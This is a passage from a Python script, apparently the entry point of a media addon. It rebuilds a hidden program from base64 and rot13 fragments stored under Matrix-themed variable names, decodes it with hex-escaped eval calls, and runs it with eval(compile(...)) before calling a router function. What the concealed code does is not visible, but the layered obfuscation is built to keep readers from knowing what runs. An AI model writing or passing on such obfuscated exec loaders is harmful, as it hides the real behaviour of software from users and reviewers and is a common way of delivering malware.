AwyprQMzKUt2MIk4ZwxaXD0XMKMuoPuwo21jnJkyXUcfnJVhMTIwo21jpzImpluvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AzIprQL1KUt2MvpcXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])
